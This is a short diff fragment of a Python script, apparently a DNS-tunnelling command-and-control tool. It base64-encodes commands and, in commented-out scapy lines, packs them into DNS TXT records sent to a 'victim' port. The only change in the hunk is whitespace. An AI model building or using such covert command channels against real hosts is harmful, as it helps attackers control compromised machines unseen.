@@ -73,7 +73,7 @@ def send_command(ip_adr,vic_sport,get_qname,packet):
         prefix = FILE
     bin_command = bytes(command_name.encode())
     print(bin_command)
-
+ 
     combined = base64.b64encode(prefix) + base64.b64encode(bin_command)
     #pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)/DNS(qd=DNSQR(qtype="TXT", qname=data_recieved,an=DNSRR(rdata=combined)))
     # pkt_no_dns = IP(dst=ip_adr)/UDP(dport=vic_sport)
